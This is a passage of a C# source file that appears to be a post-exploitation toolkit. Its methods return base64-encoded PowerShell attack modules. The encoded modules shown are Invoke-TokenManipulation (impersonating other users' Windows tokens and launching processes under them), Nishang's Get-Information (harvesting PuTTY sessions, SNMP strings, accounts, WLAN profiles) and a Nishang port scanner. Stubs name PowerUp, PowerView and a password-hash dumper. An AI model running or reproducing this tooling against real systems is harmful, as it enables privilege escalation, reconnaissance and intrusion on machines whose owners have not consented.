1hdGlvbiAtaFRva2VuICRoVG9rZW4KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRSZXR1cm5PYmogLW5lICRudWxsKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUmV0dXJuT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgVGhyZWFkSWQgLVZhbHVlICRUaHJlYWQuSWQKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRBbGxUb2tlbnMgKz0gJFJldHVybk9iagogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gJEFsbFRva2VucwogICAgfQoKCiAgICBmdW5jdGlvbiBJbnZva2UtUmV2ZXJ0VG9TZWxmCiAgICB7CiAgICAgICAgUGFyYW0oCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249MCldCiAgICAgICAgICAgIFtTd2l0Y2hdCiAgICAgICAgICAgICRTaG93T3V0cHV0CiAgICAgICAgKQoKICAgICAgICAkU3VjY2VzcyA9ICRSZXZlcnRUb1NlbGYuSW52b2tlKCkKCiAgICAgICAgaWYgKCRTaG93T3V0cHV0KQogICAgICAgIHsKICAgICAgICAgICAgaWYgKCRTdWNjZXNzKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQgIlJldmVydFRvU2VsZiB3YXMgc3VjY2Vzc2Z1bC4gUnVubmluZyBhczogJChbRW52aXJvbm1lbnRdOjpVc2VyRG9tYWluTmFtZSlcJChbRW52aXJvbm1lbnRdOjpVc2VyTmFtZSkiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQgIlJldmVydFRvU2VsZiBmYWlsZWQuIFJ1bm5pbmcgYXM6ICQoW0Vudmlyb25tZW50XTo6VXNlckRvbWFpbk5hbWUpXCQoW0Vudmlyb25tZW50XTo6VXNlck5hbWUpIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKCiAgICAjTWFpbiBmdW5jdGlvbgogICAgZnVuY3Rpb24gTWFpbgogICAgewogICAgICAgIGlmICgtbm90IChbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NQcmluY2lwYWxdIFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKS5Jc0luUm9sZShbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NCdWlsdEluUm9sZV0gIkFkbWluaXN0cmF0b3IiKSkKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLUVycm9yICJTY3JpcHQgbXVzdCBiZSBydW4gYXMgYWRtaW5pc3RyYXRvciIgLUVycm9yQWN0aW9uIFN0b3AKICAgICAgICB9CgogICAgICAgICNJZiBydW5uaW5nIGluIHNlc3Npb24gMCwgZm9yY2UgTm9VSQogICAgICAgIGlmIChbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NdOjpHZXRDdXJyZW50UHJvY2VzcygpLlNlc3Npb25JZCAtZXEgMCkKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlJ1bm5pbmcgaW4gU2Vzc2lvbiAwLCBmb3JjaW5nIE5vVUkgKHByb2Nlc3NlcyBpbiBTZXNzaW9uIDAgY2Fubm90IGhhdmUgYSBVSSkiCiAgICAgICAgICAgICROb1VJID0gJHRydWUKICAgICAgICB9CgogICAgICAgIGlmICgkUHNDbWRsZXQuUGFyYW1ldGVyU2V0TmFtZSAtaWVxICJSZXZUb1NlbGYiKQogICAgICAgIHsKICAgICAgICAgICAgSW52b2tlLVJldmVydFRvU2VsZiAtU2hvd091dHB1dAogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCRQc0NtZGxldC5QYXJhbWV0ZXJTZXROYW1lIC1pZXEgIkNyZWF0ZVByb2Nlc3MiIC1vciAkUHNDbWRsZXQuUGFyYW1ldGVyU2V0TmFtZSAtaWVxICJJbXBlcnNvbmF0ZVVzZXIiKQogICAgICAgIHsKICAgICAgICAgICAgJEFsbFRva2VucyA9IEVudW0tQWxsVG9rZW5zCiAgICAgICAgICAgIAogICAgICAgICAgICAjU2VsZWN0IHRoZSB0b2tlbiB0byB1c2UKICAgICAgICAgICAgW0ludFB0cl0kaFRva2VuID0gW0ludFB0cl06Olplcm8KICAgICAgICAgICAgJFVuaXF1ZVRva2VucyA9IChHZXQtVW5pcXVlVG9rZW5zIC1BbGxUb2tlbnMgJEFsbFRva2VucykuVG9rZW5CeVVzZXIKICAgICAgICAgICAgaWYgKCRVc2VybmFtZSAtbmUgJG51bGwgLWFuZCAkVXNlcm5hbWUgLW5lICcnKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZiAoJFVuaXF1ZVRva2Vucy5Db250YWluc0tleSgkVXNlcm5hbWUpKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRoVG9rZW4gPSAkVW5pcXVlVG9rZW5zWyRVc2VybmFtZV0uaFRva2VuCiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiU2VsZWN0aW5nIHRva2VuIGJ5IHVzZXJuYW1lIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLUVycm9yICJBIHRva2VuIGJlbG9uZ2luZyB0byB0aGUgc3BlY2lmaWVkIHVzZXJuYW1lIHdhcyBub3QgZm91bmQuIFVzZXJuYW1lOiAkKCRVc2VybmFtZSkiIC1FcnJvckFjdGlvbiBTdG9wCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmICggJFByb2Nlc3NJZCAtbmUgJG51bGwgLWFuZCAkUHJvY2Vzc0lkIC1uZSAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBmb3JlYWNoICgkVG9rZW4gaW4gJEFsbFRva2VucykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBpZiAoKCRUb2tlbiB8IEdldC1NZW1iZXIgUHJvY2Vzc0lkKSAtYW5kICRUb2tlbi5Qcm9jZXNzSWQgLWVxICRQcm9jZXNzSWQpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkaFRva2VuID0gJFRva2VuLmhUb2tlbgogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJTZWxlY3RpbmcgdG9rZW4gYnkgUHJvY2Vzc0lEIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpZiAoJGhUb2tlbiAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtRXJyb3IgIkEgdG9rZW4gYmVsb25naW5nIHRvIFByb2Nlc3NJZCAkKCRQcm9jZXNzSWQpIGNvdWxkIG5vdCBiZSBmb3VuZC4gRWl0aGVyIHRoZSBwcm9jZXNzIGRvZXNuJ3QgZXhpc3Qgb3IgaXQgaXMgYSBwcm90ZWN0ZWQgcHJvY2VzcyBhbmQgY2Fubm90IGJlIG9wZW5lZC4iIC1FcnJvckFjdGlvbiBTdG9wCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmICgkVGhyZWFkSWQgLW5lICRudWxsIC1hbmQgJFRocmVhZElkIC1uZSAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBmb3JlYWNoICgkVG9rZW4gaW4gJEFsbFRva2VucykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBpZiAoKCRUb2tlbiB8IEdldC1NZW1iZXIgVGhyZWFkSWQpIC1hbmQgJFRva2VuLlRocmVhZElkIC1lcSAkVGhyZWFkSWQpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkaFRva2VuID0gJFRva2VuLmhUb2tlbgogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJTZWxlY3RpbmcgdG9rZW4gYnkgVGhyZWFkSWQiCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmICgkaFRva2VuIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1FcnJvciAiQSB0b2tlbiBiZWxvbmdpbmcgdG8gVGhyZWFkSWQgJCgkVGhyZWFkSWQpIGNvdWxkIG5vdCBiZSBmb3VuZC4gRWl0aGVyIHRoZSB0aHJlYWQgZG9lc24ndCBleGlzdCBvciB0aGUgdGhyZWFkIGlzIGluIGEgcHJvdGVjdGVkIHByb2Nlc3MgYW5kIGNhbm5vdCBiZSBvcGVuZWQuIiAtRXJyb3JBY3Rpb24gU3RvcAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZiAoJFByb2Nlc3MgLW5lICRudWxsKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBmb3JlYWNoICgkVG9rZW4gaW4gJEFsbFRva2VucykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBpZiAoKCRUb2tlbiB8IEdldC1NZW1iZXIgUHJvY2Vzc0lkKSAtYW5kICRUb2tlbi5Qcm9jZXNzSWQgLWVxICRQcm9jZXNzLklkKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGhUb2tlbiA9ICRUb2tlbi5oVG9rZW4KICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiU2VsZWN0aW5nIHRva2VuIGJ5IFByb2Nlc3Mgb2JqZWN0IgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpZiAoJGhUb2tlbiAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtRXJyb3IgIkEgdG9rZW4gYmVsb25naW5nIHRvIFByb2Nlc3MgJCgkUHJvY2Vzcy5OYW1lKSBQcm9jZXNzSWQgJCgkUHJvY2Vzcy5JZCkgY291bGQgbm90IGJlIGZvdW5kLiBFaXRoZXIgdGhlIHByb2Nlc3MgZG9lc24ndCBleGlzdCBvciBpdCBpcyBhIHByb3RlY3RlZCBwcm9jZXNzIGFuZCBjYW5ub3QgYmUgb3BlbmVkLiIgLUVycm9yQWN0aW9uIFN0b3AKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLUVycm9yICJNdXN0IHN1cHBseSBhIFVzZXJuYW1lLCBQcm9jZXNzSWQsIFRocmVhZElkLCBvciBQcm9jZXNzIG9iamVjdCIgIC1FcnJvckFjdGlvbiBTdG9wCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICNVc2UgdGhlIHRva2VuIGZvciB0aGUgc2VsZWN0ZWQgYWN0aW9uCiAgICAgICAgICAgIGlmICgkUHNDbWRsZXQuUGFyYW1ldGVyU2V0TmFtZSAtaWVxICJDcmVhdGVQcm9jZXNzIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWYgKC1ub3QgJE5vVUkpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgU2V0LURlc2t0b3BBQ0xzCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgQ3JlYXRlLVByb2Nlc3NXaXRoVG9rZW4gLWhUb2tlbiAkaFRva2VuIC1Qcm9jZXNzTmFtZSAkQ3JlYXRlUHJvY2VzcyAtUHJvY2Vzc0FyZ3MgJFByb2Nlc3NBcmdzIC1QYXNzVGhydTokUGFzc1RocnUKCiAgICAgICAgICAgICAgICBJbnZva2UtUmV2ZXJ0VG9TZWxmCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmICgkSW1wZXJzb25hdGVVc2VyKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBJbnZva2UtSW1wZXJzb25hdGVVc2VyIC1oVG9rZW4gJGhUb2tlbiB8IE91dC1OdWxsCiAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQgIlJ1bm5pbmcgQXM6ICQoW0Vudmlyb25tZW50XTo6VXNlckRvbWFpbk5hbWUpXCQoW0Vudmlyb25tZW50XTo6VXNlck5hbWUpIgogICAgICAgICAgICB9CgogICAgICAgICAgICBGcmVlLUFsbFRva2VucyAtVG9rZW5JbmZvT2JqcyAkQWxsVG9rZW5zCiAgICAgICAgfQogICAgICAgIGVsc2VpZiAoJFBzQ21kbGV0LlBhcmFtZXRlclNldE5hbWUgLWllcSAiV2hvQW1JIikKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiJChbRW52aXJvbm1lbnRdOjpVc2VyRG9tYWluTmFtZSlcJChbRW52aXJvbm1lbnRdOjpVc2VyTmFtZSkiCiAgICAgICAgfQogICAgICAgIGVsc2UgI0VudW1lcmF0ZSB0b2tlbnMKICAgICAgICB7CiAgICAgICAgICAgICRBbGxUb2tlbnMgPSBFbnVtLUFsbFRva2VucwoKICAgICAgICAgICAgaWYgKCRQc0NtZGxldC5QYXJhbWV0ZXJTZXROYW1lIC1pZXEgIlNob3dBbGwiKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQgJEFsbFRva2VucwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0IChHZXQtVW5pcXVlVG9rZW5zIC1BbGxUb2tlbnMgJEFsbFRva2VucykuVG9rZW5CeVVzZXIuVmFsdWVzCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIEludm9rZS1SZXZlcnRUb1NlbGYKCiAgICAgICAgICAgIEZyZWUtQWxsVG9rZW5zIC1Ub2tlbkluZm9PYmpzICRBbGxUb2tlbnMKICAgICAgICB9CiAgICB9CgoKICAgICNTdGFydCB0aGUgbWFpbiBmdW5jdGlvbgogICAgTWFpbgp9Cgp9IC1OYW1lIEludm9rZS1Ub2tlbk1hbmlwdWxhdGlvbgo="));
        }

        public static string InvokeWMICommand()
        {
            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@""));
        }

        public static string PowerUp()
        {
            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@""));
        }
        
        public static string PowerView()
        {
            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@""));
        }

        public static string Nishang_GetInformation()
        {
            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@"TmV3LU1vZHVsZSAtU2NyaXB0QmxvY2sgewoKZnVuY3Rpb24gR2V0LUluZm9ybWF0aW9uIAp7CjwjCi5TWU5PUFNJUwpOaXNoYW5nIFBheWxvYWQgd2hpY2ggZ2F0aGVycyBqdWljeSBpbmZvcm1hdGlvbiBmcm9tIHRoZSB0YXJnZXQuCgouREVTQ1JJUFRJT04KVGhpcyBwYXlsb2FkIGV4dHJhY3RzIGluZm9ybWF0aW9uIGZvcm0gcmVnaXN0cnkgYW5kIHNvbWUgY29tbWFuZHMuIApUaGUgaW5mb3JtYXRpb24gYXZhaWxhYmxlIHdvdWxkIGJlIGRlcGVuZGVudCBvbiB0aGUgcHJpdmlsZWdlIHdpdGggd2hpY2ggdGhlIHNjcmlwdCB3b3VsZCBiZSBleGVjdXRlZC4KCi5FWEFNUExFClBTID4gR2V0LUluZm9ybWF0aW9uCgpVc2UgYWJvdmUgdG8gZXhlY3V0ZSB0aGUgZnVuY3Rpb24uCgouTElOSwpodHRwOi8vbGFib2ZhcGVuZXRyYXRpb250ZXN0ZXIuYmxvZ3Nwb3QuY29tLwpodHRwczovL2dpdGh1Yi5jb20vc2FtcmF0YXNob2svbmlzaGFuZwojPgogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtICgpCgogICAgZnVuY3Rpb24gcmVnaXN0cnlfdmFsdWVzKCRyZWdrZXksICRyZWd2YWx1ZSwkY2hpbGQpIAogICAgeyAKICAgICAgICBpZiAoJGNoaWxkIC1lcSAibm8iKXska2V5ID0gZ2V0LWl0ZW0gJHJlZ2tleX0gCiAgICAgICAgZWxzZXska2V5ID0gZ2V0LWNoaWxkaXRlbSAkcmVna2V5fSAKICAgICAgICAka2V5IHwgCiAgICAgICAgRm9yRWFjaC1PYmplY3QgeyAKICAgICAgICAkdmFsdWVzID0gR2V0LUl0ZW1Qcm9wZXJ0eSAkXy5QU1BhdGggCiAgICAgICAgRm9yRWFjaCAoJHZhbHVlIGluICRfLlByb3BlcnR5KSAKICAgICAgICB7IAogICAgICAgIGlmICgkcmVndmFsdWUgLWVxICJhbGwiKSB7JHZhbHVlcy4kdmFsdWV9IAogICAgICAgIGVsc2VpZiAoJHJlZ3ZhbHVlIC1lcSAiYWxsbmFtZSIpeyR2YWx1ZX0gCiAgICAgICAgZWxzZSB7JHZhbHVlcy4kcmVndmFsdWU7YnJlYWt9IAogICAgICAgIH19fSAKCXRyeSB7ICRvdXRwdXQgPSAiTG9nZ2VkIGluIHVzZXJzOmBuIiArICgocmVnaXN0cnlfdmFsdWVzICJoa2xtOlxzb2Z0d2FyZVxtaWNyb3NvZnRcd2luZG93cyBudFxjdXJyZW50dmVyc2lvblxwcm9maWxlbGlzdCIgInByb2ZpbGVpbWFnZXBhdGgiKSAtam9pbiAiYHJgbiIpIH0gY2F0Y2gge30KICAgIHRyeSB7ICRvdXRwdXQgPSAkb3V0cHV0ICsgImBuYG4gUG93ZXJzaGVsbCBlbnZpcm9ubWVudDpgbiIgKyAoKHJlZ2lzdHJ5X3ZhbHVlcyAiaGtsbTpcc29mdHdhcmVcbWljcm9zb2Z0XHBvd2Vyc2hlbGwiICJhbGxuYW1lIikgIC1qb2luICJgcmBuIikgfSBjYXRjaCB7fQogICAgdHJ5IHsgJG91dHB1dCA9ICRvdXRwdXQgKyAiYG5gbiBQdXR0eSB0cnVzdGVkIGhvc3RzOmBuIiArICgocmVnaXN0cnlfdmFsdWVzICJoa2N1Olxzb2Z0d2FyZVxzaW1vbnRhdGhhbVxwdXR0eSIgImFsbG5hbWUiKSAgLWpvaW4gImByYG4iKSB9IGNhdGNoIHt9CiAgICB0cnkgeyAkb3V0cHV0ID0gJG91dHB1dCArICJgbmBuIFB1dHR5IHNhdmVkIHNlc3Npb25zOmBuIiArICgocmVnaXN0cnlfdmFsdWVzICJoa2N1Olxzb2Z0d2FyZVxzaW1vbnRhdGhhbVxwdXR0eVxzZXNzaW9ucyIgImFsbCIpICAtam9pbiAiYHJgbiIpIH0gY2F0Y2gge30KICAgIHRyeSB7ICRvdXRwdXQgPSAkb3V0cHV0ICsgImBuYG4gUmVjZW50bHkgdXNlZCBjb21tYW5kczpgbiIgKyAoKHJlZ2lzdHJ5X3ZhbHVlcyAiaGtjdTpcc29mdHdhcmVcbWljcm9zb2Z0XHdpbmRvd3NcY3VycmVudHZlcnNpb25cZXhwbG9yZXJccnVubXJ1IiAiYWxsIiAibm8iKSAgLWpvaW4gImByYG4iKSB9IGNhdGNoIHt9CiAgICB0cnkgeyAkb3V0cHV0ID0gJG91dHB1dCArICJgbmBuIFNoYXJlcyBvbiB0aGUgbWFjaGluZTpgbiIgKyAoKHJlZ2lzdHJ5X3ZhbHVlcyAiaGtsbTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XHNlcnZpY2VzXExhbm1hblNlcnZlclxTaGFyZXMiICJhbGwiICJubyIpICAtam9pbiAiYHJgbiIpIH0gY2F0Y2gge30KICAgIHRyeSB7ICRvdXRwdXQgPSAkb3V0cHV0ICsgImBuYG4gRW52aXJvbm1lbnQgdmFyaWFibGVzOmBuIiArICgocmVnaXN0cnlfdmFsdWVzICJoa2xtOlxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcQ29udHJvbFxTZXNzaW9uIE1hbmFnZXJcRW52aXJvbm1lbnQiICJhbGwiICJubyIpICAtam9pbiAiYHJgbiIpIH0gY2F0Y2gge30KICAgIHRyeSB7ICRvdXRwdXQgPSAkb3V0cHV0ICsgImBuYG4gTW9yZSBkZXRhaWxzIGZvciBjdXJyZW50IHVzZXI6YG4iICsgKChyZWdpc3RyeV92YWx1ZXMgImhrY3U6XFZvbGF0aWxlIEVudmlyb25tZW50IiAiYWxsIiAibm8iKSAgLWpvaW4gImByYG4iKSB9IGNhdGNoIHt9CiAgICB0cnkgeyAkb3V0cHV0ID0gJG91dHB1dCArICJgbmBuIFNOTVAgY29tbXVuaXR5IHN0cmluZ3M6YG4iICsgKChyZWdpc3RyeV92YWx1ZXMgImhrbG06XFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxzZXJ2aWNlc1xzbm1wXHBhcmFtZXRlcnNcdmFsaWRjb21tdW5pdGllcyIgImFsbCIgIm5vIikgIC1qb2luICJgcmBuIikgfSBjYXRjaCB7fQogICAgdHJ5IHsgJG91dHB1dCA9ICRvdXRwdXQgKyAiYG5gbiBTTk1QIGNvbW11bml0eSBzdHJpbmdzIGZvciBjdXJyZW50IHVzZXI6YG4iICsgKChyZWdpc3RyeV92YWx1ZXMgImhrY3U6XFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxzZXJ2aWNlc1xzbm1wXHBhcmFtZXRlcnNcdmFsaWRjb21tdW5pdGllcyIgImFsbCIgIm5vIikgIC1qb2luICJgcmBuIikgfSBjYXRjaCB7fQogICAgdHJ5IHsgJG91dHB1dCA9ICRvdXRwdXQgKyAiYG5gbiBJbnN0YWxsZWQgQXBwbGljYXRpb25zOmBuIiArICgocmVnaXN0cnlfdmFsdWVzICJoa2xtOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGwiICJkaXNwbGF5bmFtZSIpICAtam9pbiAiYHJgbiIpIH0gY2F0Y2gge30KICAgIHRyeSB7ICRvdXRwdXQgPSAkb3V0cHV0ICsgImBuYG4gSW5zdGFsbGVkIEFwcGxpY2F0aW9ucyBmb3IgY3VycmVudCB1c2VyOmBuIiArICgocmVnaXN0cnlfdmFsdWVzICJoa2N1OlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGwiICJkaXNwbGF5bmFtZSIpICAtam9pbiAiYHJgbiIpIH0gY2F0Y2gge30KICAgIHRyeSB7ICRvdXRwdXQgPSAkb3V0cHV0ICsgImBuYG4gRG9tYWluIE5hbWU6YG4iICsgKChyZWdpc3RyeV92YWx1ZXMgImhrbG06XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEdyb3VwIFBvbGljeVxIaXN0b3J5XCIgImFsbCIgIm5vIikgIC1qb2luICJgcmBuIikgfSBjYXRjaCB7fQogICAgJG91dHB1dCA9ICRvdXRwdXQgKyAiYG5gbiBDb250ZW50cyBvZiAvZXRjL2hvc3RzOmBuIiArICgoZ2V0LWNvbnRlbnQgLXBhdGggIkM6XHdpbmRvd3NcU3lzdGVtMzJcZHJpdmVyc1xldGNcaG9zdHMiKSAgLWpvaW4gImByYG4iKSAKICAgICRvdXRwdXQgPSAkb3V0cHV0ICsgImBuYG4gUnVubmluZyBTZXJ2aWNlczpgbiIgKyAoKG5ldCBzdGFydCkgLWpvaW4gImByYG4iKSAKICAgICRvdXRwdXQgPSAkb3V0cHV0ICsgImBuYG4gQWNjb3VudCBQb2xpY3k6YG4iICsgKChuZXQgYWNjb3VudHMpICAtam9pbiAiYHJgbiIpIAogICAgJG91dHB1dCA9ICRvdXRwdXQgKyAiYG5gbiBMb2NhbCB1c2VyczpgbiIgKyAoKG5ldCB1c2VyKSAgLWpvaW4gImByYG4iKSAKICAgICRvdXRwdXQgPSAkb3V0cHV0ICsgImBuYG4gTG9jYWwgR3JvdXBzOmBuIiArICgobmV0IGxvY2FsZ3JvdXApICAtam9pbiAiYHJgbiIpIAogICAgJG91dHB1dCA9ICRvdXRwdXQgKyAiYG5gbiBXTEFOIEluZm86YG4iICsgKChuZXRzaCB3bGFuIHNob3cgYWxsKSAgLWpvaW4gImByYG4iKSAKICAgICRvdXRwdXQKCgp9Cgp9IC1OYW1lIEdldC1JbmZvcm1hdGlvbgo="));
        }

        public static string Nishang_GetPassHashes()
        {
            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@""));
        }

        public static string Nishang_PortScan()
        {
            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@"TmV3LU1vZHVsZSAtU2NyaXB0QmxvY2sgewoKZnVuY3Rpb24gUG9ydC1TY2FuIHsKPCMKLlNZTk9QU0lTCk5paHNhbmcgcGF5bG9hZCB3aGljaCBTY2FuIElQLUFkZHJlc3NlcywgUG9ydHMgYW5kIEhvc3ROYW1lcwoKLkRFU0NSSVBUSU9OClNjYW4gZm9yIElQLUFkZHJlc3NlcywgSG9zdE5hbWVzIGFuZCBvcGVuIFBvcnRzIGluIHlvdXIgTmV0d29yay4KICAgIAouUEFSQU1FVEVSIFN0YXJ0QWRkcmVzcwpTdGFydEFkZHJlc3MgUmFuZ2UKCi5QQVJBTUVURVIgRW5kQWRkcmVzcwpFbmRBZGRyZXNzIFJhbmdlCgouUEFSQU1FVEVSIFJlc29sdmVIb3N0ClJlc29sdmUgSG9zdE5hbWUKCi5QQVJBTUVURVIgU2NhblBvcnQKUGVyZm9ybSBhIFBvcnRTY2FuCgouUEFSQU1FVEVSIFBvcnRzClBvcnRzIFRoYXQgc2hvdWxkIGJlIHNjYW5uZWQsIGRlZmF1bHQgdmFsdWVzIGFyZTogMjEsMjIsMjMsNTMsNjksNzEsODAsOTgsMTEwLDEzOSwxMTEsCjM4OSw0NDMsNDQ1LDEwODAsMTQzMywyMDAxLDIwNDksMzAwMSwzMTI4LDUyMjIsNjY2Nyw2ODY4LDc3NzcsNzg3OCw4MDgwLDE1MjEsMzMwNiwzMzg5LAo1ODAxLDU5MDAsNTU1NSw1OTAxCgouUEFSQU1FVEVSIFRpbWVPdXQKVGltZSAoaW4gTWlsbGlTZWNvbmRzKSBiZWZvcmUgVGltZU91dCwgRGVmYXVsdCBzZXQgdG8gMTAwCgouRVhBTVBMRQpQUyA+IFBvcnQtU2NhbiAtU3RhcnRBZGRyZXNzIDE5Mi4xNjguMC4xIC1FbmRBZGRyZXNzIDE5Mi4xNjguMC4yNTQKCi5FWEFNUExFClBTID4gUG9ydC1TY2FuIC1TdGFydEFkZHJlc3MgMTkyLjE2OC4wLjEgLUVuZEFkZHJlc3MgMTkyLjE2OC4wLjI1NCAtUmVzb2x2ZUhvc3QKCi5FWEFNUExFClBTID4gUG9ydC1TY2FuIC1TdGFydEFkZHJlc3MgMTkyLjE2OC4wLjEgLUVuZEFkZHJlc3MgMTkyLjE2OC4wLjI1NCAtUmVzb2x2ZUhvc3QgLVNjYW5Qb3J0ClVzZSBhYm92ZSB0byBkbyBhIHBvcnQgc2NhbiBvbiBkZWZhdWx0IHBvcnRzLgoKLkVYQU1QTEUKUFMgPiBQb3J0LVNjYW4gLVN0YXJ0QWRkcmVzcyAxOTIuMTY4LjAuMSAtRW5kQWRkcmVzcyAxOTIuMTY4LjAuMjU0IC1SZXNvbHZlSG9zdCAtU2NhblBvcnQgLVRpbWVPdXQgNTAwCgouRVhBTVBMRQpQUyA+IFBvcnQtU2NhbiAtU3RhcnRBZGRyZXNzIDE5Mi4xNjguMC4xIC1FbmRBZGRyZXNzIDE5Mi4xNjguMTAuMjU0IC1SZXNvbHZlSG9zdCAtU2NhblBvcnQgLVBvcnQgODAKCi5MSU5LCmh0dHA6Ly93d3cudHJ1ZXNlYy5jb20KaHR0cDovL2Jsb2dzLnRlY2huZXQuY29tL2IvaGV5c2NyaXB0aW5nZ3V5L2FyY2hpdmUvMjAxMi8wNy8wMi91c2UtcG93ZXJzaGVsbC1mb3ItbmV0d29yay1ob3N0LWFuZC1wb3J0LWRpc2NvdmVyeS1zd2VlcHMuYXNweApodHRwczovL2dpdGh1Yi5jb20vc2FtcmF0YXNob2svbmlzaGFuZwogICAgCi5OT1RFUwpHb3VkZSAyMDEyLCBUcnVlU2VjCiM+CiAgICBbQ21kbGV0QmluZGluZygpXSBQYXJhbSgKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlLCBQb3NpdGlvbiA9IDApXQogICAgICAgIFtWYWxpZGF0ZVBhdHRlcm4oIlxiXGR7MSwzfVwuXGR7MSwzfVwuXGR7MSwzfVwuXGR7MSwzfVxiIildCiAgICAgICAgW3N0cmluZ10KICAgICAgICAkU3RhcnRBZGRyZXNzLAoKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlLCBQb3NpdGlvbiA9IDEpXQogICAgICAgIFtWYWxpZGF0ZVBhdHRlcm4oIlxiXGR7MSwzfVwuXGR7MSwzfVwuXGR7MSwzfVwuXGR7MSwzfVxiIildCiAgICAgICAgW3N0cmluZ10KICAgICAgICAkRW5kQWRkcmVzcywKICAgICAgICAKICAgICAgICBbc3dpdGNoXQo